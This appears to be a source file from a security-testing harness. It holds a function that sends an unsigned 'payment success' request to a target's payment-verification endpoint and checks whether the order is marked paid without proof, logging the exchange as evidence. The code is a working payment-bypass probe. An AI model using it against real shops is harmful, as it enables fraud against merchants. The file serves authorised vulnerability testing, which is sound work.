import type { AttackResult } from "./types.ts";
import { readOrderState } from "./util.ts";

/**
 * POSTs { status: "success", orderId } to /api/verify-payment with no
 * signature at all. Succeeded = the order actually became "paid" with no
 * valid proof supplied — verified by reading the order status page back,
 * not by trusting the response's own 200.
 */
export async function fakePaymentSuccess(
  targetUrl: string,
  orderId: string,
): Promise<AttackResult> {
  const before = await readOrderState(targetUrl, orderId);

  const requestBody = JSON.stringify({ status: "success", orderId });
  const res = await fetch(`${targetUrl}/api/verify-payment`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: requestBody,
  });
  const httpStatus = res.status;
  let responseBody = "";
  try {
    responseBody = await res.text();
  } catch {
    // ignore
  }

  const state = await readOrderState(targetUrl, orderId);
  const succeeded = state.status === "paid";

  const details = succeeded
    ? `POST {status:"success",orderId} with no signature returned ${httpStatus} (${responseBody}); the order status page now reads status="${state.status}" — marked paid with zero proof.`
    : `POST {status:"success",orderId} with no signature returned ${httpStatus} (${responseBody}); the order status page reads status="${state.status ?? "unknown"}" — the shortcut did not take effect.`;

  return {
    attackName: "fakePaymentSuccess",
    succeeded,
    details,
    httpStatus,
    targetUrl,
    evidence: {
      exchanges: [
        {
          label: "Unsigned POST",
          method: "POST",
          path: "/api/verify-payment",
          headers: { "(no signature)": "—" },
          body: requestBody,
          responseStatus: httpStatus,
          responseBody,
        },
      ],
      stateTrail: [
        { label: "before", status: before.status, creditedRupees: before.creditedAmountRupees },
        { label: "after", status: state.status, creditedRupees: state.creditedAmountRupees },
      ],
    },
  };
}
